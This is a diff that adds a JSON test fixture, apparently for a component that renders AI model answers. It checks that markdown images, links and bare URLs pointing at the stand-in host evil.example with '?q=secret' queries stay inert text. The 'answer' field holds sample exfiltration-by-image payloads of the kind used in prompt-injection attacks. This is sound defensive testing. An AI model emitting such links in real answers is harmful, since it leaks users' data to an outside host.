@@ -1,0 +1,20 @@
+{
+  "name": "markdown",
+  "threat": "Exfiltration by image: markdown images and links, autolinks and bare URLs stay text; nothing is fetched",
+  "ask": "attack markdown",
+  "answer": "![x](https://evil.example/pixel.png?q=secret) and [click](https://evil.example/) and <https://evil.example/> and https://evil.example/raw\nfaq\n  item \"![y](https://evil.example/pixel2.png?q=secret)\"\n    text \"[z](https://evil.example/)\"",
+  "expect": {
+    "text": "![x](https://evil.example/pixel.png?q=secret) and [click](https://evil.example/) and <https://evil.example/> and https://evil.example/raw\n",
+    "blocks": [
+      {
+        "faq": [
+          {
+            "q": "![y](https://evil.example/pixel2.png?q=secret)",
+            "a": "[z](https://evil.example/)"
+          }
+        ]
+      }
+    ],
+    "dropped": []
+  }
+}
